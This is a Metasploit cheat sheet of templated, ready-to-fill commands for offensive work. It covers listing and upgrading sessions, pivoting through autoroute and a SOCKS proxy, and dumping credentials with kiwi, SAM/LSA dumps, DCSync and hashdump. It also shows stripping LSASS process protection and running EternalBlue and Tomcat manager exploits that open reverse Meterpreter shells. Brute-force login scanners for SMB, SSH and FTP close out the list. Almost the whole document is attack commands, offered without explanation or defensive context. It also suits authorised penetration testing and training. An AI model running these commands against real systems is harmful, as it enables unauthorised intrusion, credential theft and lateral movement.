# Metasploit

## sessions

### List sessions

List sessions with Metasploit.

```sh title:"Metasploit List Sessions"
sessions -l
```
<!-- cheat -->

### Upgrade session

Spawn upgrade session with Metasploit.

```sh title:"Metasploit Spawn Upgrade Session"
sessions -u "$session_id"
```
<!-- cheat
var session_id
-->

### Route table

Run route table with Metasploit.

```sh title:"Metasploit Run Route Table"
route print
```
<!-- cheat -->

## pivot

### Autoroute

Run autoroute with Metasploit.

```sh title:"Metasploit Run Autoroute"
use multi/manage/autoroute
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->

### SOCKS proxy

Start SOCKS proxy with Metasploit.

```sh title:"Metasploit Start SOCKS Proxy"
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j
```
<!-- cheat -->

## meterpreter

### Load kiwi

Run load kiwi with Metasploit.

```sh title:"Metasploit Run Load Kiwi"
load kiwi
```
<!-- cheat -->

### Dump credentials

Dump credentials with Metasploit.

```sh title:"Metasploit Dump Credentials"
creds_all
```
<!-- cheat -->

### Dump SAM and secrets

Dump SAM and secrets with Metasploit.

```sh title:"Metasploit Dump SAM and Secrets"
lsa_dump_sam
lsa_dump_secrets
```
<!-- cheat -->

### DCSync

Execute DCSync with Metasploit.

```sh title:"Metasploit Execute DCSync"
dcsync "$domain_controller_name"
```
<!-- cheat
var domain_controller_name
-->

### Execute process

Execute process with Metasploit.

```sh title:"Metasploit Execute Process"
execute -H -f "$process"
```
<!-- cheat
var process := notepad.exe
-->

### Migrate by name

Run migrate by name with Metasploit.

```sh title:"Metasploit Run Migrate by Name"
migrate -N "$process_name"
```
<!-- cheat
var process_name := notepad.exe
-->

### Remove PPL

Remove PPL with Metasploit.

```sh title:"Metasploit Remove PPL"
load kiwi
kiwi_cmd "!processprotect /process:lsass.exe /remove"
creds_all
```
<!-- cheat -->

## modules

### LAPS

Run LAPS with Metasploit.

```sh title:"Metasploit Run LAPS"
use post/windows/gather/laps
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->

### EternalBlue x64

Execute EternalBlue x64 with Metasploit.

```sh title:"Metasploit Execute EternalBlue X64"
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $rhost_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
run
```
<!-- cheat
var rhost_ip
var lhost
var lport
-->

### SMB login

Scan SMB login with Metasploit.

```sh title:"Metasploit Scan SMB Login"
use auxiliary/scanner/smb/smb_login
set RHOSTS $rhost_ip
set USER_FILE $user_file
set PASS_FILE $pass_file
run
```
<!-- cheat
var rhost_ip
var user_file
var pass_file
-->

### SSH login

Scan SSH login with Metasploit.

```sh title:"Metasploit Scan SSH Login"
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $rhost_ip
set USER_FILE $user_file
set PASS_FILE $pass_file
run
```
<!-- cheat
var rhost_ip
var user_file
var pass_file
-->

### FTP login

Scan FTP login with Metasploit.

```sh title:"Metasploit Scan FTP Login"
use auxiliary/scanner/ftp/ftp_login
set RHOSTS $rhost_ip
set USER_FILE $user_file
set PASS_FILE $pass_file
run
```
<!-- cheat
var rhost_ip
var user_file
var pass_file
-->

### Tomcat manager deploy

Read tomcat manager deploy with Metasploit.

```sh title:"Metasploit Read Tomcat Manager Deploy"
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS $rhost_ip
set RPORT $rport
set USERNAME $user
set PASSWORD $pass
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
run
```
<!-- cheat
var rhost_ip
var rport := 8080
var user
var pass
var lhost
var lport
-->

### Hashdump

Dump hashdump with Metasploit.

```sh title:"Metasploit Dump Hashdump"
use post/windows/gather/hashdump
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->

### Credential collector

Dump credential collector with Metasploit.

```sh title:"Metasploit Dump Credential Collector"
use post/windows/gather/credentials/credential_collector
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->
